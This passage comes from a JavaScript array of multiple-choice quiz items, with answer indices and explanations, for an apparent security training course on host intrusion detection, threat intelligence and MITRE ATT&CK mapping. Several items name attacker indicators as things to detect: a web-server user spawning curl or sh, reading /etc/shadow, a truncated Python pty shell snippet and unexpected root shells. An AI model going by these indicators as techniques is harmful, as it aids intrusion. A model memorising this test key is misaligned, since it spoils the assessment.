      'USB hardware alerts and certificate QR logs',
      'Process/PID lineage auditing (`www-data` -> `curl`/`sh`) and system call (`execve`/`connect`) tracking',
      'MSSQL database collation logs and TopoJSON projections',
      'Gmail inbox filters and NOWPayments invoice IDs'
    ],
    correctIndex: 1,
    explanation: 'Process tree auditing captures the abnormal parent-child chain while syscall streams record `execve` invocations and outbound network socket syscalls.'
  },
  {
    id: 'Q-085',
    chapterNumber: 4,
    topic: 'Chapter 4: Host IDS (HIDS) & Endpoint Security',
    difficulty: 'Hard',
    question: 'Why does EncDec’s HIDS monitor `/etc/shadow` in addition to `/etc/passwd` on Linux servers?',
    options: [
      '`/etc/shadow` stores actual salted user password hashes and aging policies; tampering or unauthorized reads indicate credential dumping or account hijacking.',
      '`/etc/shadow` holds all public SSL certificates for Suricata.',
      '`/etc/shadow` maps internal hostnames to Cloud Firestore project IDs.',
      '`/etc/shadow` records active network TCP sequence numbers.'
    ],
    correctIndex: 0,
    explanation: 'While `/etc/passwd` contains non-secret account metadata, `/etc/shadow` holds salted credential hashes restricted to root; modifying or reading it signals credential theft or rootkit persistence.'
  },
  {
    id: 'Q-086',
    chapterNumber: 4,
    topic: 'Chapter 4: Host IDS (HIDS) & Endpoint Security',
    difficulty: 'Advanced',
    question: 'Why should an HIDS baseline store verified cryptographic hashes centrally on the SOC server rather than solely in an unprotected file on the monitored endpoint?',
    options: [
      'Because an attacker with local root compromise could alter both `/bin/systemd` and a local baseline database simultaneously to hide tampering.',
      'Because SHA-256 strings exceed standard Linux ext4 filename limits.',
      'Because endpoints cannot execute `crypto.createHash` inside Ubuntu 22.04.',
      'To allow browser users to edit `/etc/passwd` remotely.'
    ],
    correctIndex: 0,
    explanation: 'Immutable central/server-side baseline storage prevents an attacker who gains local host privilege from rewriting the benchmark hashes to whitewash their backdoor.'
  },
  {
    id: 'Q-087',
    chapterNumber: 4,
    topic: 'Chapter 4: Host IDS (HIDS) & Endpoint Security',
    difficulty: 'Hard',
    question: 'Which endpoint telemetry anomaly best exemplifies a privilege escalation attempt inside `/var/log/auth.log`?',
    options: [
      'Normal `systemd-timesyncd` NTP clock synchronization messages',
      'Repeated unauthorized `sudo` authentication failures by a non-wheel service user followed by an unexpected `COMMAND=/bin/sh` root session',
      'Successful user logout via Ctrl+D after a scheduled backup',
      'Cron executing `logrotate` at 00:00 UTC'
    ],
    correctIndex: 1,
    explanation: 'Unexpected `sudo` attempts by service accounts culminating in an interactive root shell are hallmark privilege-escalation indicators.'
  },
  {
    id: 'Q-088',
    chapterNumber: 4,
    topic: 'Chapter 4: Host IDS (HIDS) & Endpoint Security',
    difficulty: 'Advanced',
    question: 'How does continuous monitoring of `services` (`running`, `stopped`, `disabled`) complement binary FIM on critical servers?',
    options: [
      'Adversaries often disable security daemons (logging, firewall, AV) using valid admin commands without modifying binary hashes on disk.',
      'Stopped services automatically increase AES-256 ciphertext entropy.',
      'Service state telemetry replaces all TCP port scan detection rules.',
      'Disabling a service encrypts `/var/log/auth.log`.'
    ],
    correctIndex: 0,
    explanation: '"Living off the Land" / Defense Evasion (`T1562`) disables security controls via legitimate service managers (`systemctl stop`) without altering binary hashes—making service state tracking vital.'
  },

  // =========================================================================
  // CHAPTER 5: Threat Intelligence & MITRE ATT&CK Matrix (Q-089 to Q-110)
  // =========================================================================
  {
    id: 'Q-089',
    chapterNumber: 5,
    topic: 'Chapter 5: Threat Intelligence & MITRE ATT&CK Matrix',
    difficulty: 'Hard',
    question: 'Which MITRE ATT&CK technique IDs correspond accurately to Password Guessing, Network Service Discovery, Command & Scripting Interpreter, and Network Denial of Service per Chapter 5?',
    options: [
      'T1110.001, T1046, T1059, and T1498 respectively',
      'T1059, T1498, T1110.001, and T1046 respectively',
      'T1046, T1110.001, T1498, and T1059 respectively',
      'T1498, T1059, T1046, and T1110.001 respectively'
    ],
    correctIndex: 0,
    explanation: 'Chapter 5 explicitly maps T1110.001 (Password Guessing), T1046 (Network Service Discovery), T1059 (Command & Scripting Interpreter), and T1498 (Network Denial of Service).'
  },
  {
    id: 'Q-090',
    chapterNumber: 5,
    topic: 'Chapter 5: Threat Intelligence & MITRE ATT&CK Matrix',
    difficulty: 'Advanced',
    question: 'In CVSS v3 vulnerability scoring displayed by the CVE Vulnerability Radar, which vector string reflects a maximally severe, remotely exploitable flaw requiring zero authentication, zero user interaction, and breaking beyond the vulnerable component boundary?',
    options: [
      '`CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:L/I:N/A:N`',
      '`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` (Score 10.0 Critical)',
      '`CVSS:3.1/AV:P/AC:H/PR:L/UI:R/S:U/C:H/I:N/A:N`',
      '`CVSS:3.1/AV:A/AC:H/PR:H/UI:N/S:U/C:N/I:L/A:H`'
    ],
    correctIndex: 1,
    explanation: 'Network Attack Vector (`AV:N`), Low Complexity (`AC:L`), No Privileges (`PR:N`), No User Interaction (`UI:N`), Scope Changed (`S:C`), and High CIA impact produces the maximum 10.0 Critical rating.'
  },
  {
    id: 'Q-091',
    chapterNumber: 5,
    topic: 'Chapter 5: Threat Intelligence & MITRE ATT&CK Matrix',
    difficulty: 'Hard',
    question: 'In the Pyramid of Pain for Threat Intelligence indicators, why do behavioral TTPs (MITRE ATT&CK mappings) hold far greater defensive durability than raw IP addresses or MD5 file hashes?',
    options: [
      'Because adversaries can rotate IPs or recompile binaries to change hashes effortlessly, whereas altering core operational TTPs imposes high engineering cost.',
      'Because IP addresses and MD5 hashes cannot be stored in SQL databases.',
      'Because MITRE ATT&CK encrypts inbound network traffic automatically.',
      'Because Tor exit nodes never change their IPv4 addresses.'
    ],
    correctIndex: 0,
    explanation: 'Hashes and IPs are trivial/cheap for attackers to mutate per campaign; detecting underlying MITRE TTP behaviors forces attackers to rebuild toolchains and tradecraft.'
  },
  {
    id: 'Q-092',
    chapterNumber: 5,
    topic: 'Chapter 5: Threat Intelligence & MITRE ATT&CK Matrix',
    difficulty: 'Advanced',
    question: 'Why must Threat Intelligence reputation scoring apply time-decay / confidence weighting to malicious IPv4 feeds?',
    options: [
      'IPv4 addresses are constantly reassigned via cloud elasticity, NAT pools, and ISP DHCP; stale IOCs without decay cause severe false-positive blocking of legitimate users.',
      'Because IPv4 addresses expire globally every 24 hours under RFC 2822.',
      'Because confidence integers above 50 overflow 8-bit CPU registers.',
      'To guarantee Tor exit nodes gain trusted reputation scores.'
    ],
    correctIndex: 0,
    explanation: 'Compromised VPS hosts get reclaimed and reassigned; temporal confidence decay prevents stale IOC blocks from disrupting legitimate business partners.'
  },
  {
    id: 'Q-093',
    chapterNumber: 5,
    topic: 'Chapter 5: Threat Intelligence & MITRE ATT&CK Matrix',
    difficulty: 'Hard',
    question: 'What primary purpose does the EncDec Threat Search Tool serve when an analyst inputs an IPv4/IPv6 address, domain, or SHA-256 hash?',
    options: [
      'Compiles the indicator into a downloadable certificate PDF.',
      'Queries reputation history, attack origin telemetry, and historical incident associations to enrich investigation.',
      'Resets the user’s workbook progress back to Chapter 1.',
      'Rotates the Admin Safe Box passkey.'
    ],
    correctIndex: 1,
    explanation: 'The Threat Search Tool enriches arbitrary IPs, domains, or hashes with threat category, source confidence, origin telemetry, and prior incident linkages.'
  },
  {
    id: 'Q-094',
    chapterNumber: 5,
    topic: 'Chapter 5: Threat Intelligence & MITRE ATT&CK Matrix',
    difficulty: 'Hard',
    question: 'Which MITRE ATT&CK technique best classifies a SIEM alert triggered when `www-data` executes `python3 -c "import pty..."` on a compromised Linux endpoint?',
    options: [
      'T1498 (Network Denial of Service)',
      'T1059 (Command & Scripting Interpreter)',
      'T1046 (Network Service Discovery)',
      'T1110.001 (Password Guessing)'
    ],
    correctIndex: 1,
    explanation: 'Invoking Python, Bash, or PowerShell interpreters to execute adversarial commands maps directly to T1059 (Command & Scripting Interpreter).'
  },
  {
    id: 'Q-095',
    chapterNumber: 5,
    topic: 'Chapter 5: Threat Intelligence & MITRE ATT&CK Matrix',
    difficulty: 'Advanced',
    question: 'When a threat actor routes brute-force login traffic (`T1110.001`) through known Tor exit nodes, why is blind automatic whitelisting dangerous while blind permanent IP blocking may be insufficient?',
    options: [
      'Tor exit nodes only transmit ICMP packets and cannot carry HTTP POST logins.',
      'Adversaries easily hop across hundreds of exit IPs in seconds; effective defense combines behavioral rate/credential lockouts, MFA enforcement, and high-confidence reputation scoring.',
      'Tor encryption disables Suricata Aho-Corasick pattern engines.',
      'Permanent blocking overwrites MSSQL audit logs.'
    ],
    correctIndex: 1,
    explanation: 'Rotating Tor exits easily bypasses single-IP blocklists, so durable defense layers identity rate-limiting, MFA, and exit-reputation risk scoring.'
  },
  {
    id: 'Q-096',
    chapterNumber: 5,
    topic: 'Chapter 5: Threat Intelligence & MITRE ATT&CK Matrix',
    difficulty: 'Hard',
    question: 'How does the CVE Vulnerability Radar assist security teams in prioritizing infrastructure remediation?',
    options: [
      'By disabling all running software services that have a CVE ID.',
      'By correlating detected software versions against NVD entries, CVSS v3 severity scores, published exploit vectors, and recommended patches.',
      'By replacing SSL/TLS with unauthenticated plain HTTP.',
      'By hiding low-severity alerts from the audit log.'
    ],
    correctIndex: 1,
    explanation: 'Mapping asset software inventory against NVD CVSS scores and active exploit availability prioritizes urgent patching before adversaries weaponize flaws.'
  },
  {
    id: 'Q-097',
    chapterNumber: 5,
    topic: 'Chapter 5: Threat Intelligence & MITRE ATT&CK Matrix',
    difficulty: 'Advanced',
    question: 'An analyst evaluates two open CVEs on an internet-facing node: CVE-A (CVSS 9.8, no public exploit, service firewalled internally) vs CVE-B (CVSS 8.1, actively exploited in the wild on exposed ingress port 443). Which threat-intel principle drives remediation priority?',
    options: [
      'Always patch strictly by highest decimal CVSS score regardless of exposure.',
      'Combine CVSS base severity with contextual threat intelligence (active exploitation / EPSS / internet exposure), prioritizing CVE-B immediately.',
      'Defer both until the Threat Level Index reaches 100.',
      'Suppress both under Ignore / False Positive.'
    ],
    correctIndex: 1,
    explanation: 'Risk-based vulnerability management integrates technical severity (CVSS) with exploit maturity and asset reachability—making actively exploited exposed CVE-B urgent.'
  },
  {
    id: 'Q-098',
    chapterNumber: 5,
    topic: 'Chapter 5: Threat Intelligence & MITRE ATT&CK Matrix',
    difficulty: 'Hard',
    question: 'Why does cross-referencing raw alerts with standardized MITRE ATT&CK tactics benefit post-incident forensics and board reporting?',
    options: [
      'It converts unstructured packet dumps into a common adversary lifecycle taxonomy understandable across technical IR teams and executive risk governance.',
      'It deletes historical incidents older than 7 days automatically.',
      'It guarantees zero false positives on custom NIDS rules.',
      'It reduces the length of AES session keys.'
    ],
    correctIndex: 0,
    explanation: 'MITRE ATT&CK provides a shared industry vocabulary connecting tactical detection coverage gaps directly to strategic risk decisions.'
  },
  {
    id: 'Q-099',
    chapterNumber: 5,
    topic: 'Chapter 5: Threat Intelligence & MITRE ATT&CK Matrix',
    difficulty: 'Hard',
    question: 'Which MITRE ATT&CK technique corresponds directly to an NIDS alert observing sequential Nmap TCP probes scanning ports 21 through 8080?',
    options: [
      'T1046 (Network Service Discovery)',
      'T1486 (Data Encrypted for Impact)',
      'T1110.001 (Password Guessing)',
      'T1059 (Command & Scripting Interpreter)'
    ],
    correctIndex: 0,
    explanation: 'Enumerating listening network ports and services across hosts maps cleanly to T1046 (Network Service Discovery).'
  },
  {
    id: 'Q-100',
    chapterNumber: 5,
    topic: 'Chapter 5: Threat Intelligence & MITRE ATT&CK Matrix',
    difficulty: 'Advanced',
    question: 'Why should EncDec Threat Search lookups prefer SHA-256 over MD5 when attributing malware samples from untrusted external feeds?',
    options: [
      'Known practical MD5 collision generation allows threat actors or poisoned feeds to create distinct benign and malicious binaries sharing identical MD5 digests.',
      'MD5 strings cannot be transmitted inside JSON REST payloads.',
      'SHA-256 automatically removes ransomware encryption from infected files.',
      'MD5 always maps to Tor exit IP addresses.'
    ],
    correctIndex: 0,
    explanation: 'MD5 collision resistance is cryptographically broken; relying solely on MD5 risks false attribution or collision-based allowlist bypass.'
  },
  {
    id: 'Q-101',
    chapterNumber: 5,
    topic: 'Chapter 5: Threat Intelligence & MITRE ATT&CK Matrix',
    difficulty: 'Hard',
    question: 'Which three IOC categories are supported for ingestion and reputation lookup in EncDec’s Threat Intelligence feeds?',
    options: [
      'IP addresses, domains, and cryptographic file hashes',
      'PNG favicons, CSS font URLs, and HTML body lengths',
      'User first names, middle initials, and dates of birth',
      'Monitor resolutions, keyboard layouts, and printer drivers'
    ],
    correctIndex: 0,
    explanation: 'ThreatIntelFeed explicitly tracks typed IOC records across `ip`, `domain`, and `hash` indicators with confidence scores.'
  },
  {
    id: 'Q-102',
    chapterNumber: 5,
    topic: 'Chapter 5: Threat Intelligence & MITRE ATT&CK Matrix',
    difficulty: 'Advanced',
    question: 'In a multi-stage kill chain where an attacker performs `T1046` (Discovery), `T1110.001` (Credential Access), `T1059` (Execution), and `T1041` (Exfiltration), what strategic insight does mapping coverage per tactic provide?',
    options: [
      'It highlights blind spots where a specific tactic (e.g., Collection or Lateral Movement) lacks active detection rules even if perimeter alerts are high.',
      'It proves the firewall has zero open ports.',
      'It disables D3.js Bézier curves for non-critical tactics.',
      'It compresses MSSQL transaction logs.'
    ],
    correctIndex: 0,
    explanation: 'Evaluating tactic-by-tactic rule coverage identifies defensive gaps across the kill chain before adversaries exploit uncovered stages.'
  },
  {
    id: 'Q-103',
    chapterNumber: 5,
    topic: 'Chapter 5: Threat Intelligence & MITRE ATT&CK Matrix',
    difficulty: 'Hard',
    question: 'Why does high-confidence IP reputation scoring evaluate inbound connections *before* deep manual analyst investigation?',
    options: [
      'To automate early triage enrichment—immediately elevating known botnets, C2 servers, and high-confidence malicious actors above benign background noise.',
      'Because manual investigation is prohibited for IP addresses outside North America.',
      'To grant automatic Admin Gateway passkeys to high-confidence IPs.',
      'To erase packet capture buffers before DPI executes.'
    ],
    correctIndex: 0,
    explanation: 'Reputation pre-scoring surfaces high-confidence adversary infrastructure immediately, conserving human analyst effort for ambiguous anomalies.'
  },
  {
    id: 'Q-104',
    chapterNumber: 5,
    topic: 'Chapter 5: Threat Intelligence & MITRE ATT&CK Matrix',
    difficulty: 'Hard',
    question: 'Which MITRE ATT&CK technique describes a volumetric SYN flood or Layer-7 flood aimed at rendering enterprise services unavailable?',
    options: [
      'T1498 (Network Denial of Service)',
      'T1078 (Valid Accounts)',
      'T1005 (Data from Local System)',
      'T1566 (Phishing)'
    ],
    correctIndex: 0,
    explanation: 'Exhausting network bandwidth or protocol state tables to degrade availability maps directly to T1498 (Network Denial of Service).'
  },
  {
    id: 'Q-105',
    chapterNumber: 5,
    topic: 'Chapter 5: Threat Intelligence & MITRE ATT&CK Matrix',
    difficulty: 'Advanced',
    question: 'What is "false-positive poisoning" in automated Threat Intelligence feed ingestion, and how does confidence scoring mitigate it?',
    options: [
      'Adversaries inject major DNS resolvers (e.g. `8.8.8.8`) or CDN IPs into noisy public blocklists hoping an automated IPS will self-DoS; confidence thresholds and allowlist sanity checks block reckless auto-containment.',
      'Attackers overwrite browser localStorage to switch Dark Mode to Light Mode.',
      'Feed parsers multiply CVSS scores by zero.',
      'PostgreSQL deadlocks during RFC 2822 email signing.'
    ],
    correctIndex: 0,
    explanation: 'Unvetted open feeds frequently accidentally or maliciously list major public resolvers/CDNs; requiring confidence thresholds + critical infrastructure allowlists prevents catastrophic self-inflicted outages.'
  },
  {
    id: 'Q-106',
    chapterNumber: 5,
    topic: 'Chapter 5: Threat Intelligence & MITRE ATT&CK Matrix',
    difficulty: 'Hard',
    question: 'When a threat feed tags an external domain with `confidence: 96` and `threatType: C2`, which action is most defensible if Zeek NSM logs DNS queries from an internal database server to that domain?',
    options: [
      'Ignore the event because database servers regularly query unknown external C2 domains.',
      'Immediately triage/escalate the internal database host for C2 beaconing inspection (`T1071`) and validate process lineage via HIDS.',
      'Delete the DNS entry from the Threat Intel feed.',
      'Reset Cloud Firestore connection settings.'
    ],
    correctIndex: 1,
    explanation: 'An internal database server resolving a high-confidence C2 domain demands immediate escalation and HIDS process-to-socket attribution.'
  },
  {
    id: 'Q-107',
    chapterNumber: 5,
    topic: 'Chapter 5: Threat Intelligence & MITRE ATT&CK Matrix',
    difficulty: 'Hard',
    question: 'Which standardized authority publishes the CVSS v3 vulnerability entries ingested by EncDec’s CVE Vulnerability Radar?',
    options: [
      'National Vulnerability Database (NVD)',
      'Internet Assigned Numbers Authority (IANA) Port Registry',
      'W3C CSS Working Group',
      'Unicode Consortium'
    ],
    correctIndex: 0,
    explanation: 'Chapter 5 specifies ingestion from the National Vulnerability Database (NVD) for CVSS v3 scores, vectors, and patch advisories.'
  },
  {
    id: 'Q-108',
    chapterNumber: 5,
    topic: 'Chapter 5: Threat Intelligence & MITRE ATT&CK Matrix',
    difficulty: 'Advanced',
    question: 'In MITRE ATT&CK, why is distinguishing sub-technique `T1110.001` (Password Guessing) from `T1110.003` (Password Spraying) valuable for configuring SOC lockout rules?',
    options: [
      'Password guessing hammers many passwords against one account (caught by per-account lockout), whereas spraying tests one common password across many accounts (evading per-account lockouts and requiring cross-account velocity rules).',
      'Password spraying uses UDP port 53 while Password Guessing uses ICMP.',
      '`T1110.003` only occurs when MFA is enabled.',
      'There is no difference; sub-techniques are randomly numbered.'
    ],
    correctIndex: 0,
    explanation: 'Password spraying explicitly avoids per-user failed-login thresholds by spreading single guesses across hundreds of usernames, requiring cross-principal IP/subnet correlation.'
  },
  {
    id: 'Q-109',
    chapterNumber: 5,
    topic: 'Chapter 5: Threat Intelligence & MITRE ATT&CK Matrix',
    difficulty: 'Hard',
    question: 'Why does EncDec preserve `mitreMapping` strings directly on `Rule`, `Alert`, `Threat`, and `Incident` database schemas?',
    options: [
      'So coverage analytics, incident timelines, and RFC 2822 escalation emails retain consistent adversary attribution across the entire stack.',
      'Because Express middleware drops JSON responses without a `mitreMapping` key.',
      'To encrypt SQL queries sent to Microsoft SQL Server.',
      'To customize certificate PDF paper size.'
    ],
    correctIndex: 0,
    explanation: 'Persisting MITRE ATT&CK identifiers natively across rules, alerts, threats, and incidents powers automated coverage matrices and rich incident reporting.'
  },
  {
    id: 'Q-110',
    chapterNumber: 5,
    topic: 'Chapter 5: Threat Intelligence & MITRE ATT&CK Matrix',
    difficulty: 'Advanced',
    question: 'An analyst runs Threat Search on an IPv6 address associated with brute-force SSH attempts and discovers it belongs to an ASN hosting bulletproof VPN relays with 3 prior escalated incidents. What strategic defense adjustment is warranted?',
    options: [
      'Whitelist the entire /32 IPv6 block because it uses modern IPv6.',
      'Apply strict rate-limiting/MFA policies, elevate alert weighting for that ASN/prefix, and verify key-based SSH authentication across exposed Linux nodes.',
      'Disable `/var/log/auth.log` rotation permanently.',
      'Turn off IPv6 inspection in Suricata.'
    ],
    correctIndex: 1,
    explanation: 'Historical incident recurrence from a high-risk ASN supports tougher credential controls (key-only SSH, MFA), heightened scoring, and proactive perimeter rate limits.'
  }
];
